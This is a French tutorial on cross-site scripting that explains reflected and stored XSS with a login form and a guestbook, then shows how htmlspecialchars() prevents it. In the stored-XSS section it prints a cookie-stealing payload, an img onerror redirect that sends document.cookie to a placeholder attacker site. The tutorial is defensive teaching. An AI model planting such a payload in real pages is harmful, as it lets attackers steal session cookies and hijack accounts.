# La faille XSS
**Explications**
XSS (plus officiellement appelée Cross-Site Scripting) est une faille permettant l'injection de code HTML ou JavaScript dans des variables mal protégées. Il existe en fait deux types de XSS :

## Le XSS réfléchi (non permanent)
Cette faille est la plus simple des deux. Elle est appelée non permanente car elle n'est pas enregistrée dans un fichier ou dans une base de données. Elle est donc éphémère. L'exemple le plus couramment utilisé pour illustrer cette faille est la connexion à un espace membre. Bon on simplifie au maximum, donc on ne met pas de champ password. Imaginons la page suivante :

````html
<html>
    <form method="post" action="connexion.php">
        <input type="texte" name="pseudo" />
        <input type="submit" value="Connexion" />
    </form>
</html>
````
Qui envoie ses paramètres à la page connexion.php :

La page de connexion se contente de dire bonjour suivi du pseudo de l'utilisateur. Jusque-là tout est normal. Sauf si l'utilisateur a envie de s'amuser un petit peu, et décide de trouver un pseudo plus "fun". Par exemple, que se passerait-il s'il décidait d'entrer <strong>Vincent</strong> dans la zone de texte et de valider ? Eh bien il obtiendrait :



Bonjour **Vincent!**

 

Et là on réalise que l'insertion de code n'a plus de limite. On pourrait rentrer à peu près n'importe quoi. Une alerte JS par exemple :

````js
<script>alert('Il y a une faille XSS')</script>
````

## Le XSS stocké (permanent)

La faille permanente est la faille XSS la plus sérieuse car le script est sauvegardé dans un fichier ou une base de données. Il sera donc affiché à chaque ouverture du site. On prendra ici l'exemple d'un livre d'or dans lequel les utilisateurs peuvent poster un commentaire. Eh bien le problème est le même que le précédent ! Si l'utilisateur veut afficher son texte en rouge, il n'aura qu'à écrire :

````html
<p style="color:red">Ceci est un commentaire</p>
````

**Oui bon d'accord, l'utilisateur en face peut afficher du texte en couleur. Mais en quoi est-ce dangereux pour mon site ?**

C'est vrai qu'afficher du texte en couleur c'est bien beau, mais ça ne va rien apporter au hacker. Mais attention, cette faille peut s'avérer beaucoup plus dangereuse que ça ! Comme vous le savez sûrement, de nombreux sites stockent les pseudo/password de leurs utilisateurs dans des cookies (parfois les pseudo/mdp sont même en clair dans le cookie). Utilisée correctement, cette faille peut par exemple permettre au pirate de récupérer les valeurs de ces fameux cookies. Voilà comment il va procéder. Il va tout d'abord insérer un code frauduleux sur une page de votre site où il peut écrire (livre d'or par exemple) ! Il va ensuite vous envoyer un message et vous inviter à aller voir cette fameuse page. Vous, sans vous méfier, cliquez et là hop vous êtes redirigé et le pirate a récupéré votre cookie, et donc vos identifiants d'administrateur du site.

Le code qu'il aura placé sur la page du livre d'or pourra par exemple ressembler à ça :
````html
<img src="azerty.jpg" onerror="window.location='http://www.site_du_hacker.com/recuperation_cookie.php?cookie='+document.cookie;" hidden>
````
Ce script HTML/JavaScript redirige l'utilisateur s'il y a une erreur lors du chargement de l'image. Tout est bien sûr calculé pour qu'il y ait une erreur (ici, le chemin de l'image n'existe pas), vous êtes alors redirigé vers la page de récuperation_cookie.php, et tout ça en communiquant le contenu de votre cookie dans l'URL. Sur la page recuperation_cookie.php, le pirate n'aura qu'à récupérer la variable cookie grâce à un GET et la stocker dans un fichier. À partir de ce moment-là il détient vos informations personnelles. Cela peut s'avérer très embêtant, surtout si vous êtes l'administrateur du site web. 
![enter image description here](http://img.prntscr.com/img?url=http://i.imgur.com/vF8z3XF.png)

Voilà, même si vous n'avez pas tout saisi, ce n'est pas grave. Ce qui importe, c'est que vous réalisiez le risque que vous courrez à laisser une faille XSS sur votre site.

## Comment s'en protéger
La solution la plus adaptée contre cette faille est d'utiliser la fonction htmlspecialchars() . Cette fonction permet de filtrer les symboles du type <, & ou encore ", en les remplaçant par leur équivalent en HTML. Par exemple :

Le symbole & devient &amp;

Le symbole " devient &quot;

Le symbole ' devient &#39;

Reprenons le code du début et modifions tout cela :
````php
<?php

    $pseudo = htmlspecialchars($_POST['pseudo']);
    echo "Bonjour ".$pseudo." !"

?>
````
Maintenant réessayons d'envoyer <strong>vincent</strong> et ... Tadaaaaaam ! On obtient exactement ce que l'on voulait, du texte brut..
Bonjour <strong>Vincent</strong> !


